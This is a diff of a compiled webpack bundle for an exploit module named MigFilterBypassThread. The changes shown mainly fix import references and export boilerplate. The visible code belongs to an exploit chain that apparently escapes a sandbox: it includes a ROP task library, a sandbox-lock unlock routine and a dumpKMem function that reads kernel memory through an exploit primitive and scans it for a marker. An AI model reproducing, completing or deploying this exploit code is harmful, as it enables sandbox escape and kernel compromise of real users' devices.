@@ -3502,9 +3502,6 @@ var __webpack_exports__ = {};
   !*** ./src/MigFilterBypassThread.js ***!
   \**************************************/
 __webpack_require__.r(__webpack_exports__);
-/* unused harmony import specifier */ var Native;
-/* unused harmony import specifier */ var Chain;
-/* unused harmony import specifier */ var Utils;
 /* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
 /* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
 /* harmony import */ var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/TaskRop/Task */ "./src/libs/TaskRop/Task.js");
@@ -3582,15 +3579,15 @@ function unlockSandboxLock() {
 }
 
 function dumpKMem(addr, size) {
-	Chain.read(addr, Native.mem, size);
-	let buff = Native.read(Native.mem, size);
+	libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(addr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, size);
+	let buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, size);
 	let buff64 = new BigUint64Array(buff);
 	for (let i=0, j=0; i<size; i+=8, j++) {
 		let bits = buff64[j] & 0xfffn;
 		if (bits === 0x4a4n)
-			console.log(TAG, `[${Utils.hex(addr + BigInt(i))}] ${Utils.hex(i)}: ${Utils.hex(buff64[j]).padStart(16, '0')} <<< FOUND ?`);
+			console.log(TAG, `[${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__["default"].hex(addr + BigInt(i))}] ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__["default"].hex(i)}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__["default"].hex(buff64[j]).padStart(16, '0')} <<< FOUND ?`);
 		else
-			console.log(TAG, `[${Utils.hex(addr + BigInt(i))}] ${Utils.hex(i)}: ${Utils.hex(buff64[j]).padStart(16, '0')}`);
+			console.log(TAG, `[${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__["default"].hex(addr + BigInt(i))}] ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__["default"].hex(i)}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__["default"].hex(buff64[j]).padStart(16, '0')}`);
 	}
 }
 
@@ -3794,9 +3791,10 @@ catch (error) {
 	console.log(TAG, "Error: " + error);
 	console.log(TAG, "" + error.stack);
 }
-
-
 })();
 
+var __webpack_export_target__ = exports;
+for(var __webpack_i__ in __webpack_exports__) __webpack_export_target__[__webpack_i__] = __webpack_exports__[__webpack_i__];
+if(__webpack_exports__.__esModule) Object.defineProperty(__webpack_export_target__, "__esModule", { value: true });
 /******/ })()
 ;
